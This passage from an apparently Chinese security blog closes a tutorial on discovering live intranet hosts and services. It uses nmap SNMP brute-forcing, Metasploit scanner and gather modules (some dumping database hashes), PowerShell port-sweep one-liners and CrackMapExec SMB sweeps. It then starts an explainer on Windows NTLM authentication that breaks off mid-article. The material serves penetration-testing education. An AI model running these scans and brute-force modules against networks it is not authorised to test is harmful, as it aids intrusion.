<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script snmp<span class="token operator">-</span>brute <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token constant">T4</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206180125241.png" alt="image-20211206180125241" /></p>
<h2 id="53-msf扫描"><a class="anchor" href="#53-msf扫描">#</a> 5.3 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum</pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> show options</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206172933235.png" alt="image-20211206172933235" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> <span class="token constant">THREADS</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> <span class="token constant">RHOSTS</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206173041858.png" alt="image-20211206173041858" /></p>
<h1 id="00x06-smb协议探测"><a class="anchor" href="#00x06-smb协议探测">#</a> 00x06 SMB 协议探测</h1>
<h2 id="61-基于msf"><a class="anchor" href="#61-基于msf">#</a> 6.1 基于 msf</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum</pre></td></tr></table></figure><p><img data-src="C:%5CUsers%5C86183%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211206173236102.png" alt="image-20211206173236102" /></p>
<h2 id="62-基于nmap"><a class="anchor" href="#62-基于nmap">#</a> 6.2 基于 nmap</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap ‐sU ‐sS ‐‐script smb‐<span class="token keyword">enum</span>‐shares<span class="token punctuation">.</span>nse ‐p <span class="token number">445</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206173525338.png" alt="image-20211206173525338" /></p>
<h2 id="63-基于cmd"><a class="anchor" href="#63-基于cmd">#</a> 6.3 基于 CMD</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>a <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span> <span class="token keyword">do</span> start <span class="token operator">/</span>min <span class="token operator">/</span>low telnet <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>a <span class="token number">445</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129183015289-1878485326.png" alt="img" /></p>
<h2 id="64-基于powershell的一句话扫描"><a class="anchor" href="#64-基于powershell的一句话扫描">#</a> 6.4 基于 powershell 的一句话扫描</h2>
<h3 id="单ip"><a class="anchor" href="#单ip">#</a> 单 IP：</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span> echo <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object <span class="token class-name">Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"$_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206173816188.png" alt="image-20211206173816188" /></p>
<h3 id="多ip"><a class="anchor" href="#多ip">#</a> 多 ip：</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span><span class="token number">.5</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> <span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span>echo <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object <span class="token class-name">Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.$a"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206173839511.png" alt="image-20211206173839511" /></p>
<h3 id="多port多ip"><a class="anchor" href="#多port多ip">#</a> 多 port，多 IP：</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">118.</span><span class="token number">.119</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> write‐host <span class="token string">"‐‐‐‐‐‐"</span><span class="token punctuation">;</span> write‐host<span class="token string">"192.168.1.$a"</span><span class="token punctuation">;</span> <span class="token number">80</span><span class="token punctuation">,</span><span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span><span class="token function">echo</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.$a"</span><span class="token punctuation">,</span>$<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/1561366-20191129183425508-933572275.png" alt="img" /></p>
<h2 id="65-crackmapexec"><a class="anchor" href="#65-crackmapexec">#</a> 6.5 crackmapexec</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYw==">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#最方便：</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install crackmapexec</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206174512814.png" alt="image-20211206174512814" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#避免有坑：</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install <span class="token operator">-</span>y libssl<span class="token operator">-</span>dev libffi<span class="token operator">-</span>dev python<span class="token operator">-</span>dev build<span class="token operator">-</span>essential</pre></td></tr><tr><td data-num="3"></td><td><pre>pip install <span class="token operator">--</span>user pipenv</pre></td></tr><tr><td data-num="4"></td><td><pre>git clone <span class="token operator">--</span>recursive https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cnpmjs<span class="token punctuation">.</span>org<span class="token operator">/</span>byt3bl33d3r<span class="token operator">/</span>CrackMapExec</pre></td></tr><tr><td data-num="5"></td><td><pre>cd CrackMapExec <span class="token operator">&amp;&amp;</span> pipenv install</pre></td></tr><tr><td data-num="6"></td><td><pre>pipenv shell</pre></td></tr><tr><td data-num="7"></td><td><pre>python setup<span class="token punctuation">.</span>py install</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206180236994.png" alt="image-20211206180236994" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206180905729.png" alt="image-20211206180905729" /></p>
<p>默认为 100 线程:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# CrackMapExec smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206182651696.png" alt="image-20211206182651696" /></p>
<h1 id="00x07-msf探测辅助模块汇总"><a class="anchor" href="#00x07-msf探测辅助模块汇总">#</a> 00x07 MSF 探测辅助模块汇总</h1>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep    #基于arp协议发现内网存活主机，这不能通过代理使用</pre></td></tr><tr><td data-num="2"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack           #基于tcp的ack回复进行端口扫描，默认扫描<span class="token number">1</span><span class="token operator">-</span><span class="token number">10000</span>端口</pre></td></tr><tr><td data-num="3"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp           #基于tcp进行端口扫描，默认扫描<span class="token number">1</span><span class="token operator">-</span><span class="token number">10000</span>端口</pre></td></tr><tr><td data-num="4"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep    #基于udp协议发现内网存活主机</pre></td></tr><tr><td data-num="5"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe    #基于udp协议发现内网存活主机</pre></td></tr><tr><td data-num="6"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname         #基于netbios协议发现内网存活主机</pre></td></tr></table></figure><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version        #发现内网ftp服务，基于默认<span class="token number">21</span>端口</pre></td></tr><tr><td data-num="2"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version        #发现内网ssh服务，基于默认<span class="token number">22</span>端口</pre></td></tr><tr><td data-num="3"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version  #发现内网telnet服务，基于默认<span class="token number">23</span>端口</pre></td></tr><tr><td data-num="4"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp            #发现dns服务，基于默认<span class="token number">53</span>端口</pre></td></tr><tr><td data-num="5"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version      #发现内网http服务，基于默认<span class="token number">80</span>端口</pre></td></tr><tr><td data-num="6"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title             #探测内网http服务的标题</pre></td></tr><tr><td data-num="7"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version        #发现内网smb服务，基于默认的<span class="token number">445</span>端口   </pre></td></tr><tr><td data-num="8"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mssql<span class="token operator">/</span>mssql_schemadump  #发现内网SQLServer服务<span class="token punctuation">,</span>基于默认的<span class="token number">1433</span>端口</pre></td></tr><tr><td data-num="9"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>oracle<span class="token operator">/</span>oracle_hashdump  #发现内网oracle服务<span class="token punctuation">,</span>基于默认的<span class="token number">1521</span>端口 </pre></td></tr><tr><td data-num="10"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version    #发现内网mysql服务，基于默认<span class="token number">3306</span>端口</pre></td></tr><tr><td data-num="11"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner        #发现内网<span class="token constant">RDP</span>服务，基于默认<span class="token number">3389</span>端口</pre></td></tr><tr><td data-num="12"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>redis<span class="token operator">/</span>redis_server     #发现内网Redis服务，基于默认<span class="token number">6379</span>端口</pre></td></tr><tr><td data-num="13"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version        #探测内网的db2服务，基于默认的<span class="token number">50000</span>端口</pre></td></tr><tr><td data-num="14"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname         #探测内网主机的netbios名字</pre></td></tr></table></figure><p>在实战过程中，许多特殊环境下 <code>scanner</code> ， <code>db_nmap</code>  不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而 <code>gather/post</code>  下的模块，弥补了该诉求，以便快速了解域中存活主机。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner</pre></td></tr><tr><td data-num="2"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_computers</pre></td></tr><tr><td data-num="3"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_computers</pre></td></tr><tr><td data-num="4"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domain</pre></td></tr><tr><td data-num="5"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domains</pre></td></tr><tr><td data-num="6"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_user_comments</pre></td></tr><tr><td data-num="7"></td><td><pre>run windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner <span class="token constant">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.110</span>‐<span class="token number">120</span> <span class="token constant">THREADS</span><span class="token operator">=</span><span class="token number">20</span></pre></td></tr></table></figure><h1 id="00x08感言"><a class="anchor" href="#00x08感言">#</a> 00x08 感言</h1>
<p>毫无话语敢言！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206180627809.png" alt="image-20211206180627809" /></p>
<h1 id="00x09参考链接"><a class="anchor" href="#00x09参考链接">#</a> 00x09 参考链接</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vLW1vLS9wLzExOTA4MjYwLmh0bWw=">总结 \ 多种方式探测内网存活主机</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWWFuZzM0L3AvMTQ0MTE0OTcuaHRtbA==">域渗透之 CrackMapExec</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows认证系列和域前置的简单了解</title>
    <url>/article/64fd8041.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126131916790.png" alt="image-20211126131916790" /></p>
<h3 id="00x01windows之ntlm认证"><a class="anchor" href="#00x01windows之ntlm认证">#</a> 00x01.Windows 之 NTLM 认证</h3>
<p>NTLM 认证主要有本地认证和网络认证两种方式</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>本地登陆时用户密码存储在<span class="token constant">SAM</span>文件中，可以把它当作一个存储密码的数据库，所有的操作都在本地进行的。它将用户输入的密码转换为<span class="token constant">NTLM</span> Hash<span class="token punctuation">,</span>然后与<span class="token constant">SAM</span>中的<span class="token constant">NTLM</span> Hash进行比较。</pre></td></tr><tr><td data-num="2"></td><td><pre>网络认证则是基于一种Challenge<span class="token operator">/</span>Response认证机制的认证模式。</pre></td></tr></table></figure><p>windows 本地认证基础知识</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>在本地登陆的情况下，操作系统会使用用户输入的密码作为凭据去与系统中的密码进行校验，如果成功的话表明验证通过。</pre></td></tr><tr><td data-num="2"></td><td><pre>操作系统的密码存储在<span class="token constant">C</span>盘的目录下：<span class="token operator">%</span>SystemRoot<span class="token operator">%</span>\system32\config\sam</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126130422489.png" alt="image-20211126130422489" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SAM</span>用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。我们登陆系统的时候系统会自动读取<span class="token constant">SAM</span>文件中的密码与我们输入的密码进行比对，如果认证相同则可以使用该机器。</pre></td></tr><tr><td data-num="2"></td><td><pre>windows自身是不会保存明文密码的，也就是说<span class="token constant">SAM</span>中保存的不是明文而是Hash。</pre></td></tr></table></figure><h4 id="ntlm的认证过程"><a class="anchor" href="#ntlm的认证过程">#</a> NTLM 的认证过程</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">NTLM</span> Hash是怎么样生成的呢？当用户注销、重启、锁屏后，操作系统会让winlogon显示登陆界面，当winlogon<span class="token punctuation">.</span>exe接收到账号密码输入之后，会将密码交给lsass进程，这个进程会存一份明文密码，将明文密码加密成<span class="token constant">NTLM</span> Hash，对<span class="token constant">SAM</span><span class="token function">数据库比较认证。</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">(</span>winlogon<span class="token punctuation">.</span>exe即Windows Logon Process，是Windows <span class="token constant">NT</span>用户登陆程序，用于管理用户登录和退出。<span class="token constant">LSASS</span>用于微软Windows系统的安全机制。它用于本地安全和登陆策略。<span class="token punctuation">)</span></pre></td></tr></table></figure><p>比如当用户输入密码 <code>admin</code>  的时候，操作系统会将 <code>admin转换为16进制</code> ，经过 <code>Unicode转换</code> 后，再调用 <code>MD4加密算法加密</code> ，这个加密结果的 <code>十六进制</code> 就是 <code>NTLM Hash</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>admin <span class="token operator">-</span><span class="token operator">></span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">16</span>进制编码<span class="token punctuation">)</span> <span class="token operator">=</span> 61646d696e</pre></td></tr><tr><td data-num="2"></td><td><pre>61646d696e <span class="token operator">-</span><span class="token operator">></span> Unicode <span class="token operator">=</span> 610064006d0069006e00</pre></td></tr><tr><td data-num="3"></td><td><pre>610064006d0069006e00 <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">MD4</span> <span class="token operator">=</span> 209c6174da490caeb422f3fa5a7ae634</pre></td></tr></table></figure><p>加密脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>Description <span class="token operator">=</span> <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="5"></td><td><pre>NTLM计算过程</pre></td></tr><tr><td data-num="6"></td><td><pre>admin -> hex = 61646d696e</pre></td></tr><tr><td data-num="7"></td><td><pre>61646d696e-> Unicode = 610064006d0069006e00</pre></td></tr><tr><td data-num="8"></td><td><pre>610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634</pre></td></tr><tr><td data-num="9"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>Description<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>Password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Your Password:'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span>Password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>hash_hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'->'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>hash_hex<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="本地认证的流程"><a class="anchor" href="#本地认证的流程">#</a> 本地认证的流程</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>winlogon<span class="token punctuation">.</span>exe <span class="token operator">-</span><span class="token operator">></span> 接收用户输入 <span class="token operator">-</span><span class="token operator">></span> lsass<span class="token punctuation">.</span>exe <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>认证<span class="token punctuation">)</span></pre></td></tr></table></figure><p><code>Windows Logon Process(即 winlogon.exe)</code> ，是 <code>Windows NT</code>  用户登 陆程序，用于管理用户登录和退出。</p>
<p><code>LSASS</code>  用于微软 Windows 系统的安全机 制。它用于本地安全和登陆策略。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126130927563.png" alt="image-20211126130927563" /></p>
<h4 id="windows网络认证"><a class="anchor" href="#windows网络认证">#</a> <strong>windows 网络认证</strong></h4>
<p>在工作组中，无论是局域网中的一台机器还是很多机器，它们能够通信的话都无法相互建立一个完美的信任机制。只要有一个可以信任的信托机构，对两方进行认证，这样就有第三方来证实双方的可信任性。</p>
<p>在了解认证之前先了解一些 SMB 协议：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SMB</span>（ServerMessage <span class="token function">Block）通信协议是微软（Microsoft）和英特尔</span><span class="token punctuation">(</span>Intel<span class="token punctuation">)</span>在<span class="token number">1987</span>年制定的协议，主要是作为Microsoft网络的通讯协议。<span class="token constant">SMB</span> 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。<span class="token constant">SMB</span>使用了NetBIOS的应用程序接口 （Application Program Interface，简称<span class="token constant">API</span>），一般端口使用为<span class="token number">139</span>，<span class="token number">445</span>。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有<span class="token number">65</span>个最上层的作业，而每个作业都超过<span class="token number">120</span>个函数，甚至Windows <span class="token constant">NT</span>也没有全部支持到，最近微软又把 <span class="token constant">SMB</span> 改名为 <span class="token constant">CIFS</span>（CommonInternet File System），并且加入了许多新的特色。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>早期<span class="token constant">SMB</span>协议在网络上传输的是明文口令。后来出现<span class="token constant">LAN</span> Manager ChallengeReponse 验证机制，简称<span class="token constant">LM</span>。</pre></td></tr><tr><td data-num="4"></td><td><pre>微软提出了windowsNT挑战<span class="token operator">/</span>响应验证机制，简称<span class="token constant">MTLM</span>。现在已经更新到了<span class="token constant">V2</span>版本以及加入了Kerberos验证体系</pre></td></tr></table></figure><h4 id="ntlm-协议"><a class="anchor" href="#ntlm-协议">#</a> <strong>NTLM 协议</strong></h4>
<p>NTLM 是一种网络认证协议，它是基于 <code>挑战（Chalenge）/响应（Response）</code> 认证机制的一种认证模式。(这个协议只支持 Windows)</p>
<p>NTLM 协议的认证共需要三个消息完成：协商 --&gt; 挑战 --&gt; 认证。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>协商：主要用于确认双方协议版本、加密等级等</pre></td></tr><tr><td data-num="2"></td><td><pre>挑战：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。并生成一个随机数challenge<span class="token punctuation">,</span> 然后生成challenge消息返回给客户端。该消息就是挑战<span class="token operator">/</span>响应认证机制的主要功能体现。</pre></td></tr><tr><td data-num="3"></td><td><pre>认证：验证主要是在挑战完成后，验证结果，是认证的最后一步。</pre></td></tr></table></figure><p>质询的完整过程：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span><span class="token function">客户端向服务器端发送用户信息</span><span class="token punctuation">(</span>用户名<span class="token punctuation">)</span>请求</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2.</span>服务器接受到请求，生成一个<span class="token number">16</span>位的随机数，被称之为“Challenge”， 使用登录用户名对应的<span class="token constant">NTLM</span> <span class="token function">Hash加密Challenge</span><span class="token punctuation">(</span><span class="token number">16</span>位随机字符<span class="token punctuation">)</span>， <span class="token function">生成Challenge1。同时，生成Challenge1后，将Challenge</span><span class="token punctuation">(</span><span class="token number">16</span>位随机 字符<span class="token punctuation">)</span>发送给客户端。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3.</span>客户端接受到Challenge后，使用将要登录到账户对应的<span class="token constant">NTLM</span> Hash加密Challenge生成Response，然后将Response发送至服务器端。</pre></td></tr></table></figure><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 Net NTLM Hash。</p>
<p>验证：服务器端收到客户端的 Response 后，比对 Chanllenge1 与 Response 是否相等，若相等，则认证通过。</p>
<p><strong>详细过程：</strong></p>
